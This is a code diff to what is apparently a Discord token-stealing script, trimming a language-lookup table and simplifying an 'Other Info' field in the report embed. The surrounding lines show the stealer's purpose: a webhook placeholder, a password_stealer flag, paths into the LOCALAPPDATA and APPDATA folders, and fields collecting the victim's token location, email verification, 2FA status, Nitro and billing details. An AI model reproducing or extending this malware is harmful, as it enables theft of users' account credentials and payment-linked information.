@@ -14,37 +14,6 @@ from datetime import datetime
 webhook_url = "YOUR_WEBHOOK_HERE"
 password_stealer = True
 
-languages = {
-	'da'    : 'Danish, Denmark',
-	'de'    : 'German, Germany',
-	'en-GB' : 'English, United Kingdom',
-	'en-US' : 'English, United States',
-	'es-ES' : 'Spanish, Spain',
-	'fr'    : 'French, France',
-	'hr'    : 'Croatian, Croatia',
-	'lt'    : 'Lithuanian, Lithuania',
-	'hu'    : 'Hungarian, Hungary',
-	'nl'    : 'Dutch, Netherlands',
-	'no'    : 'Norwegian, Norway',
-	'pl'    : 'Polish, Poland',
-	'pt-BR' : 'Portuguese, Brazilian, Brazil',
-	'ro'    : 'Romanian, Romania',
-	'fi'    : 'Finnish, Finland',
-	'sv-SE' : 'Swedish, Sweden',
-	'vi'    : 'Vietnamese, Vietnam',
-	'tr'    : 'Turkish, Turkey',
-	'cs'    : 'Czech, Czechia, Czech Republic',
-	'el'    : 'Greek, Greece',
-	'bg'    : 'Bulgarian, Bulgaria',
-	'ru'    : 'Russian, Russia',
-	'uk'    : 'Ukranian, Ukraine',
-	'th'    : 'Thai, Thailand',
-	'zh-CN' : 'Chinese, China',
-	'ja'    : 'Japanese',
-	'zh-TW' : 'Chinese, Taiwan',
-	'ko'    : 'Korean, Korea'
-}
-
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
 PATHS = {
@@ -156,9 +125,6 @@ def main():
 			mfa_enabled = user_data['mfa_enabled']
 			flags = user_data['flags']
 			creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y・%H:%M:%S')
-			language = languages.get(locale)
-			if not language:
-				language = "Failed to get language"
 
 			nitro = bool(user_data.get("premium_type"))
 			billing = bool(has_payment_methods(token))
@@ -187,7 +153,7 @@ def main():
 					},
 					{
 						"name": "**Other Info**",
-						"value": f'Locale: {locale} ({language})\nToken Location: {platform}\nEmail Verified: {verified}\n2fa Enabled: {mfa_enabled}\nCreation Date: {creation_date}',
+						"value": f'Locale: {locale}\nToken Location: {platform}\nEmail Verified: {verified}\n2fa Enabled: {mfa_enabled}\nCreation Date: {creation_date}',
 						"inline": True
 					},
 					{
